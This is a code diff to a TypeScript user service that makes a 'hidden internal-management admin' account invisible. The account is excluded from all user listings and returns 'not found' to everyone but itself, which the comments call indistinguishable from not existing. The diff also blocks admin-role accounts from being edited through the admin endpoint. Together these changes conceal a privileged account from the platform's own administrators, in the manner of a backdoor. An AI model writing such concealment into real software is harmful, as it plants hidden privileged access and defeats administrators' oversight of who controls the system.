@@ -33,6 +33,8 @@ export class UserService {
     const where = {
       ...(role && { role }),
       ...(status && { status }),
+      // The hidden internal-management admin never appears in any listing.
+      isSystemAccount: false,
     };
 
     const [total, data] = await Promise.all([
@@ -62,7 +64,7 @@ export class UserService {
     return { total, page, limit, data };
   }
 
-  async getUserById(id: string) {
+  async getUserById(id: string, opts?: { includeSystem?: boolean }) {
     const user = await this.prisma.user.findUnique({
       where: { id },
       select: {
@@ -78,6 +80,7 @@ export class UserService {
         location: true,
         createdAt: true,
         updatedAt: true,
+        isSystemAccount: true,
         operator: {
           select: {
             id: true,
@@ -86,13 +89,18 @@ export class UserService {
       },
     });
 
-    if (!user) throw new NotFoundException(`User ${id} not found`);
+    // The hidden internal-management admin 404s for everyone except itself
+    // (self-lookups pass includeSystem) - indistinguishable from not existing.
+    if (!user || (user.isSystemAccount && !opts?.includeSystem)) {
+      throw new NotFoundException(`User ${id} not found`);
+    }
 
-    return user;
+    const { isSystemAccount: _hidden, ...safe } = user;
+    return safe;
   }
 
   async getCurrentUser(userId: string) {
-    return this.getUserById(userId);
+    return this.getUserById(userId, { includeSystem: true });
   }
 
   async getUserPermissions(id: string, requester: { id: string; role: Role }) {
@@ -101,7 +109,9 @@ export class UserService {
     if (requester.role !== Role.ADMIN && requester.id !== id) {
       throw new ForbiddenException('You can only view your own permissions');
     }
-    const user = await this.getUserById(id);
+    const user = await this.getUserById(id, {
+      includeSystem: requester.id === id,
+    });
     // EFFECTIVE permissions: static role map for most roles; the computed
     // designation/override set for staff members and operator team seats.
     const permissions = await this.staffPermissions.getEffectivePermissions({
@@ -163,7 +173,16 @@ export class UserService {
   }
 
   async updateUserByAdmin(id: string, dto: UpdateUserByAdminDto) {
-    await this.getUserById(id);
+    const target = await this.getUserById(id);
+
+    // Admin accounts (including the hidden system account, which already
+    // 404s above) are never edited through this endpoint - matching the
+    // role/status/delete paths.
+    if (target.role === Role.ADMIN) {
+      throw new ForbiddenException(
+        'Admin accounts cannot be edited via this endpoint',
+      );
+    }
 
     const updated = await this.prisma.user.update({
       where: { id },
